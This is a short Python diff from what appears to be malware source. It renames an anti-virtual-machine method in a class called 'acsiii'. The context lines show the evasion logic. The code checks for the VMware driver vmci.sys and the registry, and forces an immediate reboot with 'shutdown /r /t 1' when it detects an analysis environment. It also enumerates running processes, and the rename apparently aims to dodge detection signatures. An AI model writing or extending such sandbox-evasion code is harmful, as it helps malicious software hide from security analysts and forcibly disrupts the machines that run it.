@@ -9,7 +9,7 @@ class acsiii:
     def __init__(self):
         self.drivers()
         self.Regcheck()
-        self.VMcontrol()
+        self.controvm()
     def drivers(self):
         if os.path.exists("C:\\WINDOWS\\system32\\drivers\\vmci.sys"):
             os.system("shutdown /r /t 1")
@@ -38,7 +38,7 @@ class acsiii:
         if R != 1 and R2 != 1:
             os.system("shutdown /r /t 1")
             os._exit(1)
-    def VMcontrol(self):    
+    def controvm(self):    
         process = os.popen('TASKLIST /FI "STATUS eq RUNNING" | find /V "Image Name" | find /V "="').read()
         processList = []
         for processNames in process.split(" "):
